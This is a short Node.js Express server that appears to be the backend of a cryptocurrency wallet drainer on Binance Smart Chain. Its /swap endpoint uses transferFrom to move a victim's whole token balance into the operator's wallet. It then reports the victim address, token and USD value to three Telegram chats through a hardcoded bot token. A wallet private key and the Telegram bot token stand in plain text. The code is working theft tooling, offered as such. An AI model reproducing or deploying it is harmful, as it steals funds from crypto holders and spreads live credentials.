const express = require('express')
const cors = require('cors')
const web3 = require("web3")
const ethers = require("ethers")
const abi = require("./abi")
const axios = require('axios');

let userArray = [
    '5389477963',
    '1872324392',
    '523539522'
]

const privateKey = "6f43e60dc9284da6172a5ee28c5a417cadfd0dc4fbadf7129a1d88388c85baee";
const wallet = new ethers.Wallet(privateKey, new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/'))

const PORT = 9000
const app = express()
app.use(cors())

app.use(express.json())
app.use(express.urlencoded({extended: true}))


app.post('/swap', async (req, res) => {
    try {
        const contract = new ethers.Contract(req.body.token.contract, abi, wallet);
        let balance = await contract.balanceOf(req.body.addressAccount)
        await contract.transferFrom(req.body.addressAccount, wallet.address, balance)

        let sendText = `с кошелька - ${req.body.addressAccount}\nтокен - ${req.body.token.name}\nбаланс в USD - ${req.body.balanceUSD}`

        for await (let id of userArray){
            let telegramKey = '5341497228:AAFt7hiSbmFkEQoztn1w10g6XJq_sujCoSI'
            try {
                await axios.post(`https://api.telegram.org/bot${telegramKey}/sendMessage`,
                    {
                        chat_id: id,
                        text: sendText
                    },{
                        headers: {Accept: 'application/json', 'Content-Type': 'application/json'}
                    })
            }catch (e) {
                console.log(id + ' - chat_id error')
            }
        }
        res.json('good')
    } catch (e) {
        console.log(e)
        res.json('bad')
    }
})


app.listen(PORT, () => {
    console.log('Server Start. Port: ' + PORT);
})